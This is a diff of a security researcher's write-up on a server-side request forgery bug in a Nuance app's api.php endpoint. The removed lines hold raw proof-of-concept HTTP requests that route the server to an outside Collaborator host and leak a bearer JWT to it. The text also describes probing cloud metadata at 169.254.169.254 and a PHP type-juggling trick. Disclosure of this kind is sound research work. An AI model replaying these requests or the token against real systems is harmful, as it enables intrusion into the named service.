@@ -31,41 +31,10 @@ Most of the traffic sent to the app were POSTs to an `api.php` endpoint, and con
 
 Flipping the `domain` parameter to a burp collab server, the app sent the request and it turned out to be a full HTTP SSRF, response and everything. After playing with params the following PoC was reasonable enough to demonstrate some behavior.
 
-Request:
-```http
-POST /api.php?tagserver/launch/agentAvailability HTTP/1.1
-Host: train.digital.nuance.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 873
-
-body=%7Baaaa%7D&domain=176h3g72su9pqi3s87m5a1n9309rxlt9i.oastify.com&endpoint=test_endpoint&params=test_param%3dtest_value&token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJudWFuY2VTbW9vY2hDbGllbnQiLCJhdWQiOlsiY2VhcGkiLCJmdCIsImRjYXBpIl0sImFsbFNpdGVBY2Nlc3MiOnRydWUsIm5iZiI6MTcyOTczMjM4NCwic2NvcGUiOlsicmVhZCJdLCJpc3MiOiJodHRwczovL2NoYXQuZGlnaXRhbC5udWFuY2UuY29tL29hdXRoLXNlcnZlciIsImV4cCI6MTcyOTczNTk4NCwiaWF0IjoxNzI5NzMyMzg0LCJqdGkiOiJWXy1HY0RQbGJMMnpiUElYU3FsbmV6Z0labUUiLCJjbGllbnRfaWQiOiJudWFuY2VTbW9vY2hDbGllbnQifQ.LylPZduF4kJEGU4QiKX43BUY5GBF_JkCZ-NhVbKrtIeHB8SQSopn0-_T0c6o6d5bOtqEsiW_4-RfGZgZ8hrJVV2-DkRyPk1kQ61SiZAW_YumL0qSRUuOvtVKE0_5Kg5CPubP_9r2_glIFd4Ji12uCKZmGmCkh0gTqwT4ghajJsvBdWAR3v5CS1f7fbCOwwvwehniMrPrNP6mP_iq-L62YnAq9pImRm4c5wkwzrivvYKmrk2y46iYara7zUqW0rauk4MDTc8ljyW5-LV8g-HoqcmuaUAe8tKxpXW5_rKP2t8cwV6F0vMUdaDHuZcNsiNfKK14MzlDxfF_tq3Y4CPMeg&type=POST
-```
-
-Response:
-```http
-HTTP/1.1 200 OK
-Date: Mon, 28 Oct 2024 02:04:30 GMT
-Server: Apache
-Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
-X-Powered-By: PHP/7.3.33
-Content-Security-Policy: default-src 'self' *.digital.nuance.com *.inq.com; script-src 'self' 'unsafe-eval' 'unsafe-inline' *.digital.nuance.com *.inq.com code.angularjs.org cdnjs.cloudflare.com; connect-src 'self' *.digital.nuance.com *.inq.com; img-src 'self' data: *.digital.nuance.com *.inq.com; style-src 'self' 'unsafe-inline' *.digital.nuance.com *.inq.com fonts.googleapis.com maxcdn.bootstrapcdn.com cdnjs.cloudflare.com; base-uri 'self'; form-action 'self'; frame-src 'self' *.digital.nuance.com *.inq.com; font-src fonts.gstatic.com maxcdn.bootstrapcdn.com; frame-ancestors 'self'; object-src 'none';
-X-Robots-Tag: none
-Content-Length: 56
-Content-Type: text/html; charset=UTF-8
-
-<html><body>8orwedk9n9l52x76qgo508zjjgmogz</body></html>
-```
+![request-response](<Pasted image 20241027220537.png>)
 
 Collab Receives:
-```http
-POST /test_endpoint?test_param=test_value HTTP/1.1
-Host: 176h3g72su9pqi3s87m5a1n9309rxlt9i.oastify.com
-Accept: */*
-Content-Type: application/x-www-form-urlencoded
-Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJudWFuY2VTbW9vY2hDbGllbnQiLCJhdWQiOlsiY2VhcGkiLCJmdCIsImRjYXBpIl0sImFsbFNpdGVBY2Nlc3MiOnRydWUsIm5iZiI6MTcyOTczMjM4NCwic2NvcGUiOlsicmVhZCJdLCJpc3MiOiJodHRwczovL2NoYXQuZGlnaXRhbC5udWFuY2UuY29tL29hdXRoLXNlcnZlciIsImV4cCI6MTcyOTczNTk4NCwiaWF0IjoxNzI5NzMyMzg0LCJqdGkiOiJWXy1HY0RQbGJMMnpiUElYU3FsbmV6Z0labUUiLCJjbGllbnRfaWQiOiJudWFuY2VTbW9vY2hDbGllbnQifQ.LylPZduF4kJEGU4QiKX43BUY5GBF_JkCZ-NhVbKrtIeHB8SQSopn0-_T0c6o6d5bOtqEsiW_4-RfGZgZ8hrJVV2-DkRyPk1kQ61SiZAW_YumL0qSRUuOvtVKE0_5Kg5CPubP_9r2_glIFd4Ji12uCKZmGmCkh0gTqwT4ghajJsvBdWAR3v5CS1f7fbCOwwvwehniMrPrNP6mP_iq-L62YnAq9pImRm4c5wkwzrivvYKmrk2y46iYara7zUqW0rauk4MDTc8ljyW5-LV8g-HoqcmuaUAe8tKxpXW5_rKP2t8cwV6F0vMUdaDHuZcNsiNfKK14MzlDxfF_tq3Y4CPMeg
-Content-Length: 0
-```
+![collab](<Pasted image 20241027220621.png>)
 
 A few things about the request / responses above:
 1. I changed the `endpoint`, `params`, and `type` values to see if those were sent too (they are) or modified the request method (they do)
@@ -73,11 +42,11 @@ A few things about the request / responses above:
 3. A POST is received by the collab (cool), but data in the `body` param wasn't sent... note that it was `{}` by default
 4. The request was CSRF-able
 
-I found it was also possible to interact with internal resources, such as VM metadata URLs, `http://169.254.169.254/xxx`. This could be inferred from application responses which included the error codes of the SSRF request itself, a useful mechanism for my purposes. Unfortunately, it wasn't possible to return data from the metadata URLs, as there wasn't a way to inject the required headers into the SSRF request (`metadata: true`). This, at least, provided some nice proof that interaction with local / internal resources was possible.
+I found it was also possible to interact with internal resources, such as VM metadata URLs, `http://169.254.169.254/xxx`. This could be inferred from application responses which included the error codes of the SSRF request itself should the SSRF fail, a useful mechanism for my purposes. Unfortunately, it wasn't possible to return data from the metadata URLs, as there wasn't a way to inject the required headers into the SSRF request (`metadata: true`). This, at least, provided some nice proof that interaction with local / internal resources was possible.
 
 ## Elevating the issue
 
-One limitation of this bug remained the inability to forward POST bodies, even though the request method could be changed to a POST and an apparent `body` parameter was present in the request. After trying a few more things, I recalled the server's response headers contained `X-Powered-By: PHP/7.3.33`. This clicked, and I sent a request with the `body` param of `body[]=test`, an attempt to leverage PHP functionality known as "type-juggling":
+One limitation of this bug remained the inability to forward POST bodies, even though the request method could be changed to a POST and an apparent `body` parameter was present. After trying a few more things, I recalled the server's response headers contained `X-Powered-By: PHP/7.3.33`. This clicked, and I sent a request with the `body` param of `body[]=test`-- an attempt to leverage PHP functionality known as "type-juggling":
 
 ```http
 POST /api.php?tagserver/launch/agentAvailability HTTP/1.1
